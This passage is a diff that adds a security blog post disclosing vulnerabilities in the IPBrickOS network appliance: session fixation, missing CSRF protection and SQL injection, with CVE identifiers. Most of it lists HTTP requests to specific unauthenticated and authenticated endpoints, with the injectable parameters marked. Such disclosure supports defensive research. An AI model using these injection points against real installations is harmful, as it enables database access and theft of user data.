@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Multiple Vulnerabilties in IPBrickOS (CVE-2018-16136) (CVE-2018-16137) (CVE-2018-16138)</title>
+  <meta name="description" content="In today’s post we will look into an Operating System designed as an All-in-one solution to carry out management of enterprise computer networks. It acts as ...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/web/multiple/2019/02/01/Multiple-Vulnerabilities-IPBrick.html">
+  <link rel="alternate" type="application/rss+xml" title="0x90" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">0x90</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Multiple Vulnerabilties in IPBrickOS (CVE-2018-16136) (CVE-2018-16137) (CVE-2018-16138)</h1>
+    <p class="post-meta"><time datetime="2019-02-01T00:01:00+00:00" itemprop="datePublished">Feb 1, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>In today’s post we will look into an Operating System designed as an All-in-one solution to carry out management of enterprise computer networks. It acts as a firewall VoIP central, WebServer, FileServer and so on..</p>
+
+<p>Although the “OS” (IPBrickOS) uses open source libraries and tools, they are poorly implemented. Since the company provides a trial for testing the system, I decided to install it, configure it like any other and try it out to look for anything sketchy.</p>
+
+<p>It wasn’t long for me to find situations that are not common in a security application, let alone a firewall.</p>
+
+<p>Let’s start at the beginning. IPBrickOS (administrator interface) has a vulnerability called <a href="https://www.owasp.org/index.php/Session_fixation">Session Fixation</a>. This vulnerability causes the reuse of a session that shouldn’t be active anymore. In dumb terms on the login page, there is a method that counts down the session time to expire. After the time expire the session should be destroyed, and a new session ID should be provided upon the request.
+However, if we make a request with the same sessionID, it’s accepted, and the login will be “regenerated”.</p>
+
+<p>This is dangerous since, for some reason, an attacker obtains a session cookie that had expired, if the administrators’ logins again using the same cookie, the authentication is bypassed.</p>
+
+<p>Some would say that the attack is a bit far fetched. But imagine if an attacker is able to set a cookie and wait for the administrator to login. Then he is able to, using the same cookie, to impersonate the user. This may be seen on the OWASP guide (link above) and how an attacker may do this.</p>
+
+<p>Continuing reading this post will see that, this situation, is easy to exploit.</p>
+
+<p><strong>CVE-2018-16136 Lack of Anti-CSRF tokens in the whole administrative interface</strong></p>
+
+<p>The administrator interface (shortly called IPBrickOS from now on) does NOT enforce the check for CSRF. As seen in this <a href="https://www.0x90.zone/websecurity/2017/12/11/CSRFandCOORS.html">post</a> this vulnerability may lead to the unknown submission of unwanted forms. An example: creating a new administrator to access the interface. And for the reader that thinks that POST forms aren’t vulnerable, please read <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">this</a> carefully!</p>
+
+<p>Every single form of this application is vulnerable. Yes, the administrator needs to be logged in, still not a vulnerability that should be presented in a security appliance.</p>
+
+<p><strong>CVE-2018-16137 SQL injection</strong></p>
+
+<p>This vulnerability is concerning. This security “solution” doesn’t validate almost any forms. In part since they think that an authenticated user will not exploit the system to obtain access to the database. This “solution” obfuscates the PHP code with the <a href="http://www.zend.com/en/products/zend-guard">Zend Guard</a>, so it will be difficult to read source files. However, we can extrapolate some information from the database: Users, Passwords various configurations and so on.</p>
+
+<p>Luckily we have both authenticated and unauthenticated SQL injection. Although the unauthenticated that I found are from a schema that doesn’t have information about sessions. However, there is an unauthenticated SQL injection for the logs of the Web Proxy of the solution. This leaks out users and URLs. It can impact severely on the security of the enterprise to understand preferences and for user enumeration. Other endpoints are available related to other access that we can extrapolate from the URL of the injection points.</p>
+
+<p>Unfortunately, the authenticated part is segregated from the authenticated part. However, that doesn’t exclude the ability to escalate privileges.</p>
+
+<p><strong>UnAuthenticated</strong></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
+dateStart=2018-03-14&amp;dateEnd=2018-03-14&amp;periodo=1&amp;musername=1&amp;msourceip=1&amp;mtimestamp=1&amp;msize=1&amp;mcode=1&amp;murl=1&amp;fusername=*&amp;fsourceip=&amp;furl=&amp;offset=0&amp;limit=100&amp;orderby=0&amp;orderby2=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
+dateStart=2018-03-14&amp;dateEnd=2018-03-14&amp;periodo=1&amp;musername=1&amp;msourceip=1&amp;mtimestamp=1&amp;msize=1&amp;mcode=1&amp;murl=1&amp;fusername=&amp;fsourceip=&amp;furl=*&amp;offset=0&amp;limit=100&amp;orderby=0&amp;orderby2=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
+dateStart=2018-03-14&amp;dateEnd=2018-03-14&amp;periodo=1&amp;musername=1&amp;msourceip=1&amp;mtimestamp=1&amp;msize=1&amp;mcode=1&amp;murl=1&amp;fusername=&amp;fsourceip=*&amp;furl=&amp;offset=0&amp;limit=100&amp;orderby=0&amp;orderby2=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
+dateStart=2018-03-14*&amp;dateEnd=2018-03-14&amp;periodo=1&amp;musername=1&amp;msourceip=1&amp;mtimestamp=1&amp;msize=1&amp;mcode=1&amp;murl=1&amp;fusername=&amp;fsourceip=&amp;furl=&amp;offset=0&amp;limit=100&amp;orderby=0&amp;orderby2=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLStats_proxy.php
+dateStart=2018-03-14&amp;dateEnd=2018-03-14*&amp;periodo=1&amp;musername=1&amp;msourceip=1&amp;mtimestamp=1&amp;msize=1&amp;mcode=1&amp;murl=1&amp;fusername=&amp;fsourceip=&amp;furl=&amp;offset=0&amp;limit=100&amp;orderby=0&amp;orderby2=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLAccesses_ssl.php
+dateStart=2018-03-16*&amp;dateEnd=2018-03-16&amp;periodo=1&amp;offset=0&amp;limit=100&amp;orderby=1&amp;orderby2=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLAccesses_ssl.php
+dateStart=2018-03-16&amp;dateEnd=2018-03-16*&amp;periodo=1&amp;offset=0&amp;limit=100&amp;orderby=1&amp;orderby2=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLAccesses_ppp.php
+dateStart=2018-03-16*&amp;dateEnd=2018-03-16&amp;periodo=1&amp;offset=0&amp;limit=100&amp;orderby=1&amp;orderby2=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLAccesses_ppp.php
+dateStart=2018-03-16&amp;dateEnd=2018-03-16*&amp;periodo=1&amp;offset=0&amp;limit=100&amp;orderby=1&amp;orderby2=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLAccesses_ftp.php
+dateStart=2018-03-16*&amp;dateEnd=2018-03-16&amp;periodo=1&amp;offset=0&amp;limit=100&amp;orderby=1&amp;orderby2=0
+
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/ajax/generateXMLAccesses_ftp.php
+dateStart=2018-03-16&amp;dateEnd=2018-03-16*&amp;periodo=1&amp;offset=0&amp;limit=100&amp;orderby=1&amp;orderby2=0
+</code></pre>
+</div>
+
+<p><strong>Authenticated</strong></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>GET
+https://ipbrick.domain.com/corpo.php?pagina=utilizador_alterar&amp;f_utilizador=*
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>GET
+https://ipbrick.domain.com/corpo.php?pagina=voip_placas_pstn_inserir&amp;tipoplaca=297373351*
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>GET
+https://ipbrick.domain.com/corpo.php?pagina=export_access_pdf&amp;dateStart=2018-03-16&amp;dateEnd=2018-03-16&amp;periodo=1&amp;a_ppp=ppp*&amp;offset=0&amp;limit=0
+
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>GET
+https://ipbrick.domain.com/corpo.php?pagina=export_access_pdf&amp;dateStart=2018-03-16&amp;dateEnd=2018-03-16&amp;periodo=1&amp;a_ssl=ssl*&amp;offset=0&amp;limit=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>GET
+https://ipbrick.domain.com/corpo.php?pagina=export_access_pdf&amp;dateStart=2018-03-16&amp;dateEnd=2018-03-16*&amp;periodo=1&amp;a_ppp=ppp&amp;offset=0&amp;limit=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>GET
+https://ipbrick.domain.com/corpo.php?pagina=export_access_pdf&amp;dateStart=2018-03-16*&amp;dateEnd=2018-03-16&amp;periodo=1&amp;a_ppp=ppp&amp;offset=0&amp;limit=0
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0avoip_options_alterar_altera\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"option\"\x0d\x0a\x0d\x0aintercom\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"estado_intercom_unidir\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"extra_intercom_unidir\"\x0d\x0a\x0d\x0a*62*\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"estado_intercom_bidir\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"extra_intercom_bidir\"\x0d\x0a\x0d\x0a*63\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"extra_intercom_restriction\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------9173100016821337141718121561\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------9173100016821337141718121561--\x0d\x0a
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>GET
+https://ipbrick.domain.com/corpo.php?pagina=user_sys_ver&amp;f_idusersystem=172115923*
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+pagina=vpn_configuracao_alterar_altera&amp;f_ip_inicio_1=192&amp;f_ip_inicio_2=168&amp;f_ip_inicio_3=69&amp;f_ip_inicio_4=90&amp;f_ip_fim_1=192*&amp;f_ip_fim_2=168&amp;f_ip_fim_3=69&amp;f_ip_fim_4=99&amp;f_accao=Modify
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+pagina=vpn_configuracao_alterar_altera&amp;f_ip_inicio_1=192&amp;f_ip_inicio_2=168&amp;f_ip_inicio_3=69&amp;f_ip_inicio_4=90&amp;f_ip_fim_1=192&amp;f_ip_fim_2=168*&amp;f_ip_fim_3=69&amp;f_ip_fim_4=99&amp;f_accao=Modify
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+pagina=vpn_configuracao_alterar_altera&amp;f_ip_inicio_1=192&amp;f_ip_inicio_2=168&amp;f_ip_inicio_3=69&amp;f_ip_inicio_4=90&amp;f_ip_fim_1=192&amp;f_ip_fim_2=168&amp;f_ip_fim_3=69*&amp;f_ip_fim_4=99&amp;f_accao=Modify
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+pagina=vpn_configuracao_alterar_altera&amp;f_ip_inicio_1=192&amp;f_ip_inicio_2=168&amp;f_ip_inicio_3=69&amp;f_ip_inicio_4=90&amp;f_ip_fim_1=192&amp;f_ip_fim_2=168&amp;f_ip_fim_3=69&amp;f_ip_fim_4=99*&amp;f_accao=Modify
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
+pagina=vpn_configuracao_alterar_altera&amp;f_ip_inicio_1=192*&amp;f_ip_inicio_2=168&amp;f_ip_inicio_3=69&amp;f_ip_inicio_4=90&amp;f_ip_fim_1=192&amp;f_ip_fim_2=168&amp;f_ip_fim_3=69&amp;f_ip_fim_4=99&amp;f_accao=Modify
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST
+https://ipbrick.domain.com/corpo.php
